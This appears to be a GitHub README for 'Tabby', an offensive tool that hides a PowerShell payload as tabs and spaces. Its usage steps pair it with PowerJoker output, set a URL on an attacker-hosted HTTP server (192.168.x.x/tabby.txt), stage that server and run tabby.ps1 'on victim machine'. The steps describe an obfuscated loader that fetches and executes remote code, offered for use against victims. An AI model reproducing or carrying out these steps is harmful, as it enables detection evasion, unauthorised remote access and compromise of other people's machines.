<img src="https://github.com/Kryp7os/Tabby/assets/98974230/a2e9a43a-452d-4e61-b730-5968c0ddd767" width="300" />

# Tabby

Tool that converts a payload into tabs and spaces and executes

## Usage

### Generate the Payload:
1. Launch PowerJoker(https://github.com/Adkali/PowerJoker) and copy the base64 output.

2. Launch tabme.py using:
`python3 tabme.py`

### Preparing the Payload
1. Paste the base64 encoding in `tabme.py`

2. Specify the outfile i.e `tabby.txt`

3. Add your http server to the powershell script:
`$tabsSpacesURL = "http://192.168.x.x/tabby.txt"`

### Stage your Http server
`python3 -m http.server 80`

### Execute ps1 file on victim machine

`.\tabby.ps1`
